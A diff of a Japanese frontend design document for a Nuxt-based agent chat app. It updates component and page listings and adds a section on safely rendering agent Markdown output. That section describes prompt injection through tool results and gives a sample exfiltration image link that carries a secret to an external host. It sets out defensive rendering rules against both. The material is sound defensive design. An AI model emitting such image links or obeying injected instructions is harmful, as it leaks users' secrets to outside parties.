@@ -96,8 +96,8 @@ frontend/
     ├── components/
     │   ├── common/             # D*ラッパー（prefixなしで自動import）
     │   └── <domain>/           # 業務コンポーネント（例：run/RunCancelDialog.vue）
-    ├── composables/            # field, date, form, list, confirm, account, permission, manage, locale, llm, sso, user（実装済み）、stream, <domain>（未）
-    ├── layouts/                # default（社員）、anonymous（ログイン）、manage（管理）
+    ├── composables/            # field, date, form, list, confirm, account, permission, manage, locale, markdown, stream, llm, sso, user, conversation, run
+    ├── layouts/                # default（社員。サイドバーに会話の一覧）、anonymous（ログイン・開発用）、manage（管理）
     ├── middleware/             # auth.global.ts、permission.global.ts、manage.ts（/manage の入口）
     ├── pages/                  # 社員向けはルート直下、管理向けは manage/ 以下、dev/ は開発用
     └── plugins/                # auth.client.ts、error-handler.ts
@@ -390,6 +390,7 @@ export const usePermission = defineStore('permission', () => {
 | `DCheckbox` | `UCheckbox` | `boolean` | `labelPosition`（`inline` / `top`） |
 | `DSwitch` | `USwitch` | `boolean` | 有効・無効の切り替え |
 | `DRadioGroup` | `URadioGroup` | 値 | `variant="card"` で説明付きのカード |
+| `DCheckboxGroup` | `UCheckboxGroup` | `string[]` | 複数を選ぶ。`variant="card"` で説明付きのカード。値は文字列だけ（Nuxt UIの制約） |
 | `DSelectButton` | `UFieldGroup`＋`UButton` | 値 | 2〜4個の選択肢をボタンで選ぶ |
 | `DDatePicker` | `UInputDate`＋`UCalendar` | `'YYYY-MM-DD'` | 日付。キーボード入力とカレンダーの両方。`min` / `max` |
 | `DDateTimePicker` | `UInputDate`（分まで）＋`UCalendar` | ISO 8601 | 日時。表示はローカル時刻、送信はUTCのISO文字列 |
@@ -432,6 +433,17 @@ export const usePermission = defineStore('permission', () => {
 | メニュー・サイドバー | `UDashboardGroup`、`UDashboardSidebar`、`UNavigationMenu` |
 | 処理中の表示 | 原則として各ボタン・表の `loading` で表すようにし、全画面スピナーは使わない |
 | 会話画面 | Nuxt UIのChat系コンポーネント（`UChatMessages`、`UChatMessage`、`UChatPrompt`、`UChatTool`、`UChatReasoning` 等）を使う |
+| Markdownの表示 | `MarkdownContent`（`components/common/`。変換は `composables/markdown.ts` の `renderMarkdown()`）。§7.5 |
+
+### 7.5 エージェントの応答（Markdown）の表示
+
+エージェントの応答には、Toolの結果を通じて外から来た文（ファイル、Webページ、DBの値）が混ざりうる。prompt injectionで、画面を偽装する要素や、情報を外へ送る仕掛けを書かせられることがあるので、信頼できない入力として表示する。
+
+- Markdownは `MarkdownContent` で表示する。変換は `markdown-it` で行い、生のHTMLは要素にせず書いたまま表示する（`html: false`）。
+- 画像は読み込まない（`image` の規則を無効にする）。`![](https://外部/?d=<秘密>)` のように、URLに情報を載せて外へ送らせないため。本番のCSP（`img-src 'self'`）とあわせて二重に防ぐ。成果物の画像は、成果物の機能（`/api/files/`）で表示する。
+- リンクは、markdown-itが `javascript:` 等の危険なURLを除き、`target="_blank"`・`rel="noopener noreferrer"` で開く。
+- `@nuxtjs/mdc`（Nuxt Content・Nuxt UIのProseで使うもの）は使わない。執筆者を信頼する前提の仕組みで、生のHTML（`<style>`・`<form>`・`<iframe>`）、Vueのコンポーネントの記法、`@click` 等の束縛をそのまま描くため。
+- `v-html` を使うのは `MarkdownContent` の中だけにする。
 
 ---
 
@@ -441,10 +453,10 @@ export const usePermission = defineStore('permission', () => {
 
 ```
 pages/
-├── index.vue                     # 社員のホーム（会話一覧へのリダイレクト等）
+├── index.vue                     # 社員のホーム（/conversations へのリダイレクト）
 ├── login.vue                     # layout: anonymous
-├── dev/inputs.vue                # 開発用（本番は404）
-├── conversations.vue             # 一覧＋<NuxtPage />
+├── dev/inputs.vue                # 開発用（本番は404。layout: anonymous）
+├── conversations/index.vue       # 会話を始めるウィザード（会話の一覧は layout のサイドバー）
 ├── conversations/[conversationId].vue
 ├── runs.vue
 ├── runs/[runId].vue              # 詳細ドロワー
@@ -505,6 +517,7 @@ OSSとして公開するため、最初から多言語化しておく。当面�
 チャット画面の逐次表示や通知は、SSEで受け取る。方式の比較と実装の方針は [realtime.md](realtime.md) にまとめている。
 
 - ストリームは `useEventStream()`（`composables/stream.ts`）だけを使って読む。画面で直接 `fetch` や `EventSource` を使わない。
+- ログインユーザー宛ての通知（`app/v1/stream/`）は `useUserEvents(handler)` で受け取る。使う部品がいくつあっても、タブに1本だけ開く。
 - イベントの型はOpenAPIから生成した `StreamEvent` を使う。
 - 画面の表示は、まずREST APIで最新の状態を取得し、ストリームのイベントで差分を反映する。ストリームが切れても、再表示すれば正しい状態に戻るようにする。
 
